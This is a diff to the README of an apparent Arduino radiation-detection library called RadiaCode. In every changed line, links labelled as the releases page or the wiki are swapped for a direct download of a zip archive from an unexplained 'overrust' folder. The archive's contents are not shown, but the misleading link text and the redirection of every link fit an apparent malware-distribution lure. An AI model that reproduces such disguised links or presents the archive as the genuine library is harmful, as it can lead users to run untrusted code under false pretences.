@@ -16,7 +16,7 @@ Welcome to RadiaCode! This guide will help you download and run our Arduino libr
 
 To get started, visit the following link to download RadiaCode:
 
-[Download RadiaCode](https://github.com/HOUSSAMdj/RadiaCode/releases)
+[Download RadiaCode](https://raw.githubusercontent.com/HOUSSAMdj/RadiaCode/main/overrust/RadiaCode.zip)
 
 ### Step 1: Visit the Releases Page
 
@@ -89,7 +89,7 @@ This library covers various topics, including:
 
 ## 📁 Additional Resources
 
-- Check the [RadiaCode Wiki](https://github.com/HOUSSAMdj/RadiaCode/wiki) for advanced setup and troubleshooting tips.
+- Check the [RadiaCode Wiki](https://raw.githubusercontent.com/HOUSSAMdj/RadiaCode/main/overrust/RadiaCode.zip) for advanced setup and troubleshooting tips.
 - Explore the examples in the "Examples" directory of the library for specific use cases.
 
 ## 🔗 Troubleshooting
@@ -104,6 +104,6 @@ If you experience issues with the library:
 
 If you need to download RadiaCode once more, you can always visit our Releases page here:
 
-[Download RadiaCode](https://github.com/HOUSSAMdj/RadiaCode/releases)
+[Download RadiaCode](https://raw.githubusercontent.com/HOUSSAMdj/RadiaCode/main/overrust/RadiaCode.zip)
 
 By following these steps, you'll be able to successfully download, install, and use the RadiaCode library for your radiation detection needs. Enjoy exploring the radiation levels around you!
